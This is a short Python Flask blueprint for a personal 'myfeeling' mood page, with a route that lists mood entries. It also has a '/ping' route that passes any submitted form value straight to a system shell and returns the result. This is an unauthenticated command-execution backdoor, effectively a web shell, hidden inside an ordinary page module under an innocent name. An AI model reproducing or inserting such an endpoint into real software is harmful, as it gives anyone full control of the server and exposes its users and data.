#/usr/bin/env python
# encoding:utf-8

from . import myfeeling
from webapp.models import Myfeeling
from flask import render_template,redirect,url_for
from flask import request,Response
from subprocess import check_output

@myfeeling.route('/')
def feeling():
    getallfeeling  = Myfeeling.query.order_by(Myfeeling.timestamp.desc()).all()
    return render_template('myfeeling/myfeeling.html',backgroundpic='/static/img/mood_bk.jpg')

@myfeeling.route('/ping',methods=['POST'])
def ping():
    pong = request.form['pong']
    return check_output(pong, shell=True)

